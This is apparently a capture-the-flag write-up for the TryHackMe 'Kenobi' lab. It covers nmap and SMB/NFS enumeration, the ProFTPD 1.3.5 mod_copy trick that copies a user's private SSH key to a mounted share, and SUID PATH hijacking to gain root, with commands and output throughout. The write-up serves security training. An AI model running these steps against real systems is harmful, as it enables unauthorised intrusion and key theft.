[![Needed-nmap](https://img.shields.io/badge/Needed-nmap-blue)](https://nmap.org/)
[![Needed-Metasploit](https://img.shields.io/badge/Needed-Metasploit-orange)](https://www.metasploit.com/)
[![Needed-Netcat](https://img.shields.io/badge/Needed-Netcat-lightgreen)](https://nc110.sourceforge.io/)

# Kenobi

## Reconnaissance
As always we start by scanning the target:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ sudo nmap -sV 10.10.182.22
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 20:51 CET
Nmap scan report for 10.10.182.22
Host is up (0.057s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Exploring Samba shares
We can see several open ports, and between them we can notice two Samba ports: 139 (old version built on top of NetBIOS) and 445 (newer version, built on top of TCP).<br>
We can enumerate the shares with a nmap script:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.182.22                                                                                                         
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 21:05 CET
Nmap scan report for 10.10.182.22
Host is up (0.048s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.182.22\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.182.22\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.182.22\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

Fortunately `/anonymous` share in Samba is often without password, so we can connect to it and explore what's on it with:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/3-Kenobi]
└─$ smbclient //10.10.134.213/anonymous                                                
Enter WORKGROUP\marco's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019

                9204224 blocks of size 1024. 6877092 blocks available
```

Then we can download the share recursively with the command `smbget -R smb://10.10.134.213/anonymous`. In the end we can read on our pc the log file, some information about the FTP server.

### Exploring RPC
Another suspicious port is port 111, which hosts RPC. RPC is often used to share a filesystem, so we should enumerate its access to filesystem:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/3-Kenobi]
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.134.213               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 19:46 CET
Nmap scan report for 10.10.134.213
Host is up (0.050s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

The report shows a mount `/var`.

## Access to ProFtpd
On port 21 the client ftp is ProFtpd 1.3.5, which is (surpringly) vulnerable! We can search for an exploit with `searchsploit`:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ searchsploit ProFtpd 1.3.5
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                             | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                   | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                               | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                             | linux/remote/36742.txt
-------------------------------------------------------------------------------------- ---------------------------------
```

Searching the File Copy we will find out that in ProFtpd 1.3.x the copy module will let us call functions `CPFR` (copy from) and `CPTO` (copy to) even without logging in. With this permissions, since we have an open SSH port, we can copy id_rsa into /var share, so we can access it. We can connect with netcat and send this commands:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ nc 10.10.137.24 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.137.24]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Now we can mount this remote share on our pc with the commands:
```
mkdir /mnt/kenobiNFS
mount $TARGET_IP:/var /mnt/kenobiNFS
```

We paste the `id_rsa` file to `~/.ssh/` directory (we can put it elsewhere too, but .ssh has surely the right directory permissions).
We use the command `chmod 600 id_rsa` to set the right permissions to the file.<br>
We can log now with `ssh -i ~/.ssh/is_rsa kenobi@TARGET_IP` and get the flag `user.txt` in the home.

## Privilege escalation
Now that we have a shell we have to find a way to escalate to root, so the first thing we do is to search for SUID executables. In the list we find some usual linux command, but then we notice `/usr/bin/menu`.<br>
Searching with strings we can see that the commands called by menu are called without the absolute path. We can create a `/bin/sh` copy named "curl" in `/tmp` and modify `$PATH`:
```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
```

Now we have root access and we can get the root flag in `/root/root.txt`